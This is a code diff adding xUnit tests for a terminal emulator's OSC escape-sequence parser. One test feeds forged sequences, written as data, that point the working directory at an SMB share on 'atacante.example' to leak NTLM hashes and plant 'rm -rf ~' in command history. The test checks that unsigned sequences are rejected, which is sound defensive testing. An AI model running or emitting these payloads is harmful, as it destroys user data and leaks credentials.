@@ -65,6 +65,38 @@ public class OscParserTests
         Assert.Empty(parser.Feed($"{Esc}[32mverde{Esc}[0m {Esc}]0;título da janela{Bel}"));
     }
 
+    [Fact]
+    public void Com_nonce_comando_e_pasta_assinados_valem()
+    {
+        var parser = new OscParser("abc123");
+
+        var events = parser.Feed(
+            $"{Esc}]633;E;npm run dev;abc123{Bel}{Esc}]133;C{Bel}" +
+            $"{Esc}]133;D;0{Bel}{Esc}]633;P;Cwd=file:///C:/dev/a;b;abc123{Bel}");
+
+        Assert.Collection(events,
+            e => Assert.Equal("npm run dev", Assert.IsType<CommandLineReceived>(e).Command),
+            e => Assert.IsType<CommandStarted>(e),
+            e => Assert.IsType<CommandFinished>(e),
+            e => Assert.Equal(@"C:\dev\a;b", Assert.IsType<CwdChanged>(e).Path));
+    }
+
+    [Fact]
+    public void Com_nonce_a_saida_de_um_programa_nao_forja_comando_nem_pasta()
+    {
+        // Um "cat" de arquivo malicioso: tenta apontar a aba para um servidor SMB (vazaria o hash NTLM no git status)
+        // e pôr um comando de várias linhas no histórico (rodaria ao colar pelo Ctrl+R).
+        var parser = new OscParser("abc123");
+        var output =
+            $"{Esc}]7;file:////atacante.example/share{Bel}" +
+            $"{Esc}]633;P;Cwd=file:////atacante.example/share{Bel}" +
+            $"{Esc}]633;P;Cwd=file:////atacante.example/share;outro{Bel}" +
+            $"{Esc}]633;E;rm -rf ~\\x0a{Bel}" +
+            $"{Esc}]633;E;rm -rf ~;chute{Bel}";
+
+        Assert.Empty(parser.Feed(output));
+    }
+
     [Theory]
     [InlineData(@"echo a\x3bb", "echo a;b")]
     [InlineData(@"C:\\dev", @"C:\dev")]
